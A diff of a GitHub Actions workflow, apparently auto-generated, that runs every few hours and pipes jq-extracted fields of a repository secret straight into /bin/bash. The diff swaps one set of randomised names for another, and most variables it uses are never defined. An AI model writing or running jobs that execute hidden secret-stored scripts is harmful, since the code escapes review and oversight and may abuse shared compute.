@@ -1,25 +1,22 @@
 name: dengshiyu3340
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 4/6 * * *'
+    - cron: '59 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dengshiyu3340
         env:
-          khgt18: ${{ secrets.khgt18 }}
+          hs16: ${{ secrets.hs16 }}
         run: |
-          echo $khgt18 | jq -r .y09339 | /bin/bash
-          echo $jl20 | jq -r .vks77339 | /bin/bash
-          echo $jysmr5341 | jq -r .opfk511 | /bin/bash
-          echo $p81110 | jq -r .ma6078 | /bin/bash
-          echo $cmuj95 | jq -r .lzckc62068 | /bin/bash
-          echo $cp1 | jq -r .udmu383 | /bin/bash
-          echo $cfn02 | jq -r .karf78757 | /bin/bash
-          echo $v8053 | jq -r .b5 | /bin/bash
+          echo $hs16 | jq -r .fnu329 | /bin/bash
+          echo $ogep73204 | jq -r .b92926 | /bin/bash
+          echo $o24849 | jq -r .h991 | /bin/bash
+          echo $cw08 | jq -r .mix84160 | /bin/bash
+          echo $eynkk24179 | jq -r .eusll3 | /bin/bash
 
